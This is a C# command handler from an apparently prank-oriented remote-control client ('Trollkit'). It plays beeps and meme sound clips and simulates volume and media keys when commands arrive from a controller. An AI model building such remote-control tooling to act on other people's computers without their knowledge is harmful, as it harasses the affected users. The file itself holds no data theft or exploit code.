using System;
using System.Collections.Generic;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Interop;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;

namespace Trollkit_Client.Modules.CommandHandlers
{
	public class AudioHandler : ICommandHandler
	{
		[DllImport("user32.dll")]
		static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, IntPtr dwExtraInfo);

		private const int NEXT_TRACK = 0xB0;
		private const int PLAY_PAUSE = 0xB3;
		private const int PREV_TRACK = 0xB1;
		private const int VOLUME_MUTE = 0xAD;
		private const int VOLUME_UP = 0xAF;
		private const int VOLUME_DOWN = 0xAE;
		public bool HandleCommand(TransferCommandObject obj)
		{

			if (obj.Command == "PlayBeep")
			{
				string[] values = obj.Value.Split(',');

				if (values.Length == 2)
				{
					Console.Beep(int.Parse(values[0]), int.Parse(values[1]));
				}
				else
				{
					Console.Beep(500, 500);
				}

				return true;
			}
			else if (obj.Command == "Jeff")
			{
				SoundPlayer sndplayr = new SoundPlayer(Properties.Resources.MyNameIsJeff);
				sndplayr.Play();
				return true;
			}
			else if (obj.Command == "WesselMove")
			{
				SoundPlayer sndplayr = new SoundPlayer(Properties.Resources.EchtEenWesselSample);
				sndplayr.Play();
				return true;
			}
			else if (obj.Command == "VolumeUp")
			{
				keybd_event(VOLUME_UP, 0, 0, IntPtr.Zero);
				return true;
			}
			else if (obj.Command == "VolumeDown")
			{
				keybd_event(VOLUME_DOWN, 0, 0, IntPtr.Zero);
				return true;
			}
			else if (obj.Command == "Mute")
			{
				keybd_event(VOLUME_MUTE, 0, 0, IntPtr.Zero);
				return true;
			}
			else if (obj.Command == "Play_Pause")
			{
				keybd_event(PLAY_PAUSE, 0, 1, IntPtr.Zero);
				return true;
			}
			else if (obj.Command == "NextTrack")
			{
				keybd_event(NEXT_TRACK, 0, 1, IntPtr.Zero);
				return true;
			}
			else if (obj.Command == "PreviousTrack")
			{
				keybd_event(PREV_TRACK, 0, 1, IntPtr.Zero);
				return true;
			}

			return false;
		}

	}
}
